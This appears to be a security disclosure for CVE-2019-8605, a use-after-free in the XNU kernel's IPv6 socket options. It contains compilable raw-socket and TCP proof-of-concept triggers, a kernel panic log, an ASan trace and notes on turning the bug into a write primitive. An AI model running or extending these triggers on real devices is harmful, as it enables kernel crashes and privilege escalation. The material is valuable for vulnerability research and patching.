@@ -1,0 +1,273 @@
+# Reproduction
+Repros on 10.14.3 when run as root. It may need multiple tries to trigger.
+$ clang -o in6_selectsrc in6_selectsrc.cc
+$ while 1; do sudo ./in6_selectsrc; done
+res0: 3
+res1: 0
+res1.5: -1 // failure expected here
+res2: 0
+done
+...
+[crash]
+
+# Explanation
+The following snippet is taken from in6_pcbdetach:
+```
+void
+in6_pcbdetach(struct inpcb *inp)
+{
+    // ...
+	if (!(so->so_flags & SOF_PCBCLEARING)) {
+		struct ip_moptions *imo;
+		struct ip6_moptions *im6o;
+
+		inp->inp_vflag = 0;
+		if (inp->in6p_options != NULL) {
+			m_freem(inp->in6p_options);
+			inp->in6p_options = NULL; // <- good
+		}
+		ip6_freepcbopts(inp->in6p_outputopts); // <- bad
+		ROUTE_RELEASE(&inp->in6p_route);
+		// free IPv4 related resources in case of mapped addr
+		if (inp->inp_options != NULL) {
+			(void) m_free(inp->inp_options); // <- good
+			inp->inp_options = NULL;
+		}
+```
+
+Notice that freed options must also be cleared so they are not accidentally reused.
+This can happen when a socket is disconnected and reconnected without being destroyed.
+In the inp->in6p_outputopts case, the options are freed but not cleared, so they can be
+used after they are freed.
+
+This specific PoC requires root because I use raw sockets, but it's possible other socket
+types suffer from this same vulnerability.
+
+# Crash Log
+panic(cpu 4 caller 0xffffff8015cda29d): Kernel trap at 0xffffff8016011764, type 13=general protection, registers:
+CR0: 0x0000000080010033, CR2: 0x00007f9ae1801000, CR3: 0x000000069fc5f111, CR4: 0x00000000003626e0
+RAX: 0x0000000000000001, RBX: 0xdeadbeefdeadbeef, RCX: 0x0000000000000000, RDX: 0x0000000000000000
+RSP: 0xffffffa3ffa5bd30, RBP: 0xffffffa3ffa5bdc0, RSI: 0x0000000000000000, RDI: 0x0000000000000001
+R8:  0x0000000000000000, R9:  0xffffffa3ffa5bde0, R10: 0xffffff801664de20, R11: 0x0000000000000000
+R12: 0x0000000000000000, R13: 0xffffff80719b7940, R14: 0xffffff8067fdc660, R15: 0x0000000000000000
+RFL: 0x0000000000010282, RIP: 0xffffff8016011764, CS:  0x0000000000000008, SS:  0x0000000000000010
+Fault CR2: 0x00007f9ae1801000, Error code: 0x0000000000000000, Fault CPU: 0x4, PL: 0, VF: 0
+
+Backtrace (CPU 4), Frame : Return Address
+0xffffff801594e290 : 0xffffff8015baeb0d mach_kernel : _handle_debugger_trap + 0x48d
+0xffffff801594e2e0 : 0xffffff8015ce8653 mach_kernel : _kdp_i386_trap + 0x153
+0xffffff801594e320 : 0xffffff8015cda07a mach_kernel : _kernel_trap + 0x4fa
+0xffffff801594e390 : 0xffffff8015b5bca0 mach_kernel : _return_from_trap + 0xe0
+0xffffff801594e3b0 : 0xffffff8015bae527 mach_kernel : _panic_trap_to_debugger + 0x197
+0xffffff801594e4d0 : 0xffffff8015bae373 mach_kernel : _panic + 0x63
+0xffffff801594e540 : 0xffffff8015cda29d mach_kernel : _kernel_trap + 0x71d
+0xffffff801594e6b0 : 0xffffff8015b5bca0 mach_kernel : _return_from_trap + 0xe0
+0xffffff801594e6d0 : 0xffffff8016011764 mach_kernel : _in6_selectsrc + 0x114
+0xffffffa3ffa5bdc0 : 0xffffff8016043015 mach_kernel : _nd6_setdefaultiface + 0xd75
+0xffffffa3ffa5be20 : 0xffffff8016120274 mach_kernel : _soconnectlock + 0x284
+0xffffffa3ffa5be60 : 0xffffff80161317bf mach_kernel : _connect_nocancel + 0x20f
+0xffffffa3ffa5bf40 : 0xffffff80161b62bb mach_kernel : _unix_syscall64 + 0x26b
+0xffffffa3ffa5bfa0 : 0xffffff8015b5c466 mach_kernel : _hndl_unix_scall64 + 0x16
+
+BSD process name corresponding to current thread: in6_selectsrc
+Boot args: keepsyms=1 -v=1
+
+Mac OS version:
+18D109
+
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <net/if.h>
+#include <string.h>
+#include <netinet/in.h>
+#include <errno.h>
+
+/*
+# Reproduction
+Repros on 10.14.3 when run as root. It may need multiple tries to trigger.
+$ clang -o in6_selectsrc in6_selectsrc.cc
+$ while 1; do sudo ./in6_selectsrc; done
+res0: 3
+res1: 0
+res1.5: -1 // failure expected here
+res2: 0
+done
+...
+[crash]
+
+# Explanation
+The following snippet is taken from in6_pcbdetach:
+```
+void
+in6_pcbdetach(struct inpcb *inp)
+{
+    // ...
+	if (!(so->so_flags & SOF_PCBCLEARING)) {
+		struct ip_moptions *imo;
+		struct ip6_moptions *im6o;
+
+		inp->inp_vflag = 0;
+		if (inp->in6p_options != NULL) {
+			m_freem(inp->in6p_options);
+			inp->in6p_options = NULL; // <- good
+		}
+		ip6_freepcbopts(inp->in6p_outputopts); // <- bad
+		ROUTE_RELEASE(&inp->in6p_route);
+		// free IPv4 related resources in case of mapped addr
+		if (inp->inp_options != NULL) {
+			(void) m_free(inp->inp_options); // <- good
+			inp->inp_options = NULL;
+		}
+```
+
+Notice that freed options must also be cleared so they are not accidentally reused.
+This can happen when a socket is disconnected and reconnected without being destroyed.
+In the inp->in6p_outputopts case, the options are freed but not cleared, so they can be
+used after they are freed.
+
+This specific PoC requires root because I use raw sockets, but it's possible other socket
+types suffer from this same vulnerability.
+
+# Crash Log
+panic(cpu 4 caller 0xffffff8015cda29d): Kernel trap at 0xffffff8016011764, type 13=general protection, registers:
+CR0: 0x0000000080010033, CR2: 0x00007f9ae1801000, CR3: 0x000000069fc5f111, CR4: 0x00000000003626e0
+RAX: 0x0000000000000001, RBX: 0xdeadbeefdeadbeef, RCX: 0x0000000000000000, RDX: 0x0000000000000000
+RSP: 0xffffffa3ffa5bd30, RBP: 0xffffffa3ffa5bdc0, RSI: 0x0000000000000000, RDI: 0x0000000000000001
+R8:  0x0000000000000000, R9:  0xffffffa3ffa5bde0, R10: 0xffffff801664de20, R11: 0x0000000000000000
+R12: 0x0000000000000000, R13: 0xffffff80719b7940, R14: 0xffffff8067fdc660, R15: 0x0000000000000000
+RFL: 0x0000000000010282, RIP: 0xffffff8016011764, CS:  0x0000000000000008, SS:  0x0000000000000010
+Fault CR2: 0x00007f9ae1801000, Error code: 0x0000000000000000, Fault CPU: 0x4, PL: 0, VF: 0
+
+Backtrace (CPU 4), Frame : Return Address
+0xffffff801594e290 : 0xffffff8015baeb0d mach_kernel : _handle_debugger_trap + 0x48d
+0xffffff801594e2e0 : 0xffffff8015ce8653 mach_kernel : _kdp_i386_trap + 0x153
+0xffffff801594e320 : 0xffffff8015cda07a mach_kernel : _kernel_trap + 0x4fa
+0xffffff801594e390 : 0xffffff8015b5bca0 mach_kernel : _return_from_trap + 0xe0
+0xffffff801594e3b0 : 0xffffff8015bae527 mach_kernel : _panic_trap_to_debugger + 0x197
+0xffffff801594e4d0 : 0xffffff8015bae373 mach_kernel : _panic + 0x63
+0xffffff801594e540 : 0xffffff8015cda29d mach_kernel : _kernel_trap + 0x71d
+0xffffff801594e6b0 : 0xffffff8015b5bca0 mach_kernel : _return_from_trap + 0xe0
+0xffffff801594e6d0 : 0xffffff8016011764 mach_kernel : _in6_selectsrc + 0x114
+0xffffffa3ffa5bdc0 : 0xffffff8016043015 mach_kernel : _nd6_setdefaultiface + 0xd75
+0xffffffa3ffa5be20 : 0xffffff8016120274 mach_kernel : _soconnectlock + 0x284
+0xffffffa3ffa5be60 : 0xffffff80161317bf mach_kernel : _connect_nocancel + 0x20f
+0xffffffa3ffa5bf40 : 0xffffff80161b62bb mach_kernel : _unix_syscall64 + 0x26b
+0xffffffa3ffa5bfa0 : 0xffffff8015b5c466 mach_kernel : _hndl_unix_scall64 + 0x16
+
+BSD process name corresponding to current thread: in6_selectsrc
+Boot args: keepsyms=1 -v=1
+
+Mac OS version:
+18D109
+*/
+
+#define IPPROTO_IP 0
+
+#define IN6_ADDR_ANY { 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 }
+#define IN6_ADDR_LOOPBACK { 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 }
+
+int main() {
+    int s = socket(AF_INET6, SOCK_RAW, IPPROTO_IP);
+    printf("res0: %d\n", s);
+    struct sockaddr_in6 sa1 = {
+        .sin6_len = sizeof(struct sockaddr_in6),
+        .sin6_family = AF_INET6,
+        .sin6_port = 65000,
+        .sin6_flowinfo = 3,
+        .sin6_addr = IN6_ADDR_LOOPBACK,
+        .sin6_scope_id = 0,
+    };
+    struct sockaddr_in6 sa2 = {
+        .sin6_len = sizeof(struct sockaddr_in6),
+        .sin6_family = AF_INET6,
+        .sin6_port = 65001,
+        .sin6_flowinfo = 3,
+        .sin6_addr = IN6_ADDR_ANY,
+        .sin6_scope_id = 0,
+    };
+
+    int res = connect(s, (const sockaddr*)&sa1, sizeof(sa1));
+    printf("res1: %d\n", res);
+
+    unsigned char buffer[4] = {};
+    res = setsockopt(s, 41, 50, buffer, sizeof(buffer));
+    printf("res1.5: %d\n", res);
+
+    res = connect(s, (const sockaddr*)&sa2, sizeof(sa2));
+    printf("res2: %d\n", res);
+
+    close(s);
+    printf("done\n");
+}
+
+
+ClusterFuzz found the following crash, which indicates that TCP sockets may be affected as well.
+
+==16571==ERROR: AddressSanitizer: heap-use-after-free on address 0x610000000c50 at pc 0x7f15a39744c0 bp 0x7ffd72521250 sp 0x7ffd72521248
+READ of size 8 at 0x610000000c50 thread T0
+SCARINESS: 51 (8-byte-read-heap-use-after-free)
+    #0 0x7f15a39744bf in ip6_getpcbopt /src/bsd/netinet6/ip6_output.c:3140:25
+    #1 0x7f15a3970cb2 in ip6_ctloutput /src/bsd/netinet6/ip6_output.c:2924:13
+    #2 0x7f15a389e3ac in tcp_ctloutput /src/bsd/netinet/tcp_usrreq.c:1906:12
+    #3 0x7f15a344680c in sogetoptlock /src/bsd/kern/uipc_socket.c:5512:12
+    #4 0x7f15a346ea86 in getsockopt /src/bsd/kern/uipc_syscalls.c:2517:10
+
+0x610000000c50 is located 16 bytes inside of 192-byte region [0x610000000c40,0x610000000d00)
+freed by thread T0 here:
+    #0 0x497a3d in free _asan_rtl_:3
+    #1 0x7f15a392329d in in6_pcbdetach /src/bsd/netinet6/in6_pcb.c:681:3
+    #2 0x7f15a38733c7 in tcp_close /src/bsd/netinet/tcp_subr.c:1591:3
+    #3 0x7f15a3898159 in tcp_usr_disconnect /src/bsd/netinet/tcp_usrreq.c:743:7
+    #4 0x7f15a34323df in sodisconnectxlocked /src/bsd/kern/uipc_socket.c:1821:10
+    #5 0x7f15a34324c5 in sodisconnectx /src/bsd/kern/uipc_socket.c:1839:10
+    #6 0x7f15a34643e8 in disconnectx_nocancel /src/bsd/kern/uipc_syscalls.c:1136:10
+
+previously allocated by thread T0 here:
+    #0 0x497cbd in __interceptor_malloc _asan_rtl_:3
+    #1 0x7f15a3a28f28 in __MALLOC /src/fuzzing/zalloc.c:63:10
+    #2 0x7f15a3973cf5 in ip6_pcbopt /src/bsd/netinet6/ip6_output.c:3116:9
+    #3 0x7f15a397193b in ip6_ctloutput /src/bsd/netinet6/ip6_output.c:2637:13
+    #4 0x7f15a389e3ac in tcp_ctloutput /src/bsd/netinet/tcp_usrreq.c:1906:12
+    #5 0x7f15a3440614 in sosetoptlock /src/bsd/kern/uipc_socket.c:4808:12
+    #6 0x7f15a346e45c in setsockopt /src/bsd/kern/uipc_syscalls.c:2461:10
+
+
+#include <stdio.h>
+#include <unistd.h>
+#include <netinet/in.h>
+
+/*
+TCP-based reproducer for CVE-2019-8605
+This has the benefit of being reachable from the app sandbox on iOS 12.2.
+*/
+
+#define IPV6_3542PKTINFO 46
+
+int main() {
+    int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
+    printf("res0: %d\n", s);
+
+    unsigned char buffer[1] = {'\xaa'};
+    int res = setsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, sizeof(buffer));
+    printf("res1: %d\n", res);
+
+    res = disconnectx(s, 0, 0);
+    printf("res2: %d\n", res);
+
+    socklen_t buffer_len = sizeof(buffer);
+    res = getsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, &buffer_len);
+    printf("res3: %d\n", res);
+    printf("got %d\n", buffer[0]);
+
+    close(s);
+    printf("done\n");
+}
+
+
+It seems that this TCP testcase I've posted works nicely for UaF reads, but getting a write isn't straightforward because calling disconnectx explicitly makes subsequent setsockopt and connect/bind/accept/etc. calls fail because the socket is marked as disconnected.
+
+But there is still hope. PR_CONNREQUIRED is marked for TCP6, which means we may be able to connect twice (forcing a disconnect during the second connection) using the same TCP6 socket and have a similar situation to the original crash.
